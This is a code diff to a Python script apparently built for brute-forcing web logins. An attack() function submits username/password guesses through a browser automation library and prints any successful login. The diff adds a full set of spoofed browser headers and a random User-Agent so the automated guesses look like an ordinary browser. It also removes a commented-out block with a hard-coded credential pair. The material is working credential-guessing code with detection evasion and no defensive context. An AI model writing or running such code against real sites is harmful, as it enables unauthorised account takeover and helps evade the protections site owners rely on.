@@ -56,8 +56,16 @@ def attack(content):
         # Handle target environment that doesn't support HTTPS verification
         ssl._create_default_https_context = _create_unverified_https_context
     url = content['url']
-    user_agent = [('User-Agent', get_random_user_agent().encode().decode('utf-8'))]
-    br.addheaders=user_agent
+    headers = [('User-Agent', get_random_user_agent().encode().decode('utf-8')),
+               ('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
+                    ('Accept-Language', 'en-gb,en;q=0.5'),
+                    ('Accept-Encoding', 'gzip,deflate'),
+                    ('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7'),
+                    ('Keep-Alive', '115'),
+                    ('Connection', 'keep-alive'),
+                    ('Cache-Control', 'max-age=0'),
+                    ('Referer', url)]
+    br.addheaders=headers
 
     print('trying' +' username:' + user+' password:'+pwd)
 
@@ -69,18 +77,6 @@ def attack(content):
     br[content['password_param']] = content['password']
     res = br.submit()
 
-    '''payload = {
-       'username': 'hegleh123',
-        'password':'2X7GB5CZSFGJN',
-    }
-    headers = {
-        'user-agent': get_random_user_agent().encode().decode('utf-8'),
-    }
-    # Doing the post/get form
-    if content['method'] == 'post':
-        request = requests.post(content['url'], data=payload, headers = headers)
-    else:
-        request = requests.get(content['url'], data=payload, headers = headers)'''
     if check_login(res, content['password_param'], content['user_param']):
 
         print('login successfull\n\nusername: ' + user + '\npassword: ' + pwd)
@@ -103,12 +99,12 @@ def get_random_user_agent():
             index = random.permutation(len(lines) - 1)
             idx = np.asarray(index, dtype=np.integer)[0]
             random_proxy = lines[int(idx)]
-            return random_proxy[2:len(random_proxy) - 2]  # need to fix this later
+            return random_proxy[0:len(random_proxy) - 2]  # need to fix this later
     except Exception as ex:
         print('Exception in user agent')
         print(str(ex))
     finally:
-        return random_proxy[2:len(random_proxy) - 2]
+        return random_proxy[0:len(random_proxy) - 2]
 
 
 def check_login(content, password_param, user_param):
